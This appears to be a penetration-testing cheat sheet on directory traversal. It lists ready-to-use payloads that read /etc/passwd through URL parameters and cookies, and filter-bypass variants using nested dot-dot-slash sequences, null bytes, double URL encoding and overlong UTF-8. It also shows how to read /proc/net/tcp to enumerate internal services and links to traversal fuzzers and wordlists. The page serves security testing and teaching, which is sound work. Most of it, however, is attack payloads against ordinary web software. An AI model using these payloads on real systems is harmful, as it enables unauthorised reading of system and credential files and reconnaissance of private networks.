---
description: Directory Traversal
---

# Directory Traversal

> Directory Traversal aims to access files and directories that are stored outside the web root folder. By manipulating variables that reference files with “dot-dot-slash (../)” sequences and its variations or by using absolute file paths, it may be possible to access arbitrary files and directories stored on file system.

### Identifying Directory Traversal

We can identify this type of vulnerability by inspecting the GET/POST parameters in search of values that reference files. Example:

```bash
.php?file=$FILE
.cgi?home=$FILE
.jsp?item=$FILE
```

Cookies can also be used by the web application for the dynamic generation of pages or templates:

```bash
Cookie: PHPSESSID=d9ccd3f4f9f18cc1; TEMPLATE=$FILE
```

### Exploiting Directory Traversal

To successfully test for this flaw, the tester use the "dotdotslash" to traverse directories and point to internal files.&#x20;

```bash
#Parameter:
.php?file=../../../../etc/passwd
#Cookie:
Cookie: USER=24dedbeef44:PSTYLE=../../../../etc/passwd
```

### Bypass Restrictions

#### Traversal sequences stripped non-recursively:

```bash
.php?page=....//....//....//etc/passwd
.php?page=....\/....\/....\/etc/passwd
.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```

#### Null byte (%00):

```bash
#Bypass when app appends a file type (bypass of: $_GET['param']."php"):
.php?page=../../../etc/passwd%00
#Note: Solved since PHP 5.4
```

#### Encoding:

```bash
#You could use encondings like double URL encode (and others):
.php?page=..%252f..%252f..%252fetc%252fpasswd
.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
.php?page=%252e%252e%252fetc%252fpasswd
.php?page=%252e%252e%252fetc%252fpasswd%00
```

#### From existent folder:

```bash
#Maybe the back-end is checking the folder path:
.php?page=utils/scripts/../../../../../etc/passwd
```

#### Filter sanitization bypass:

```bash
#For example when "../" is replaced to "". 
.php?page=....//....//etc/passwd
.php?page=..///////..////..//////etc/passwd
.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
.php?page=/var/www/../../etc/passwd
```

### Enumerate local services

If we can read internal files, try reading "/proc/net/tcp" or "/proc/net/tcp6". This gives us a list of all listening TCP sockets. A typical entry of /proc/net/tcp would look like this:

!["/proc/net/tcp" example.](../../.gitbook/assets/image.png)

The first four columns represent the following information. You can read more [here](https://www.kernel.org/doc/Documentation/networking/proc\_net\_tcp.txt).

!["/proc/net/tcp" column description.](<../../.gitbook/assets/image (2).png>)

To retrieve the decimal value of the port number, just convert it from HEX. To extract the local IP, we can use the following python3 script:

```
import socket 
import struct 
hex_ip = input("Enter IP (in hex): ") 
addr_long = int(hex_ip, 16) 
print("IP in dotted-decimal notation:", socket.inet_ntoa(struct.pack("<L", addr_long)))
```

![Extracting the decimal value of the IP address](<../../.gitbook/assets/image (1).png>)

### Tools

[DotDotPwn - The Directory Traversal Fuzzer](https://github.com/wireghoul/dotdotpwn)

[Sqlmap just for LFI/RFI bugs instead of sql injection](https://github.com/kurobeats/fimap)

### Wordlists

[Path Traversal Fuzz Strings (from WFuzz Tool)](https://github.com/xmendez/wfuzz/blob/master/wordlist/Injections/Traversal.txt)

[More Traversal Strings](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)
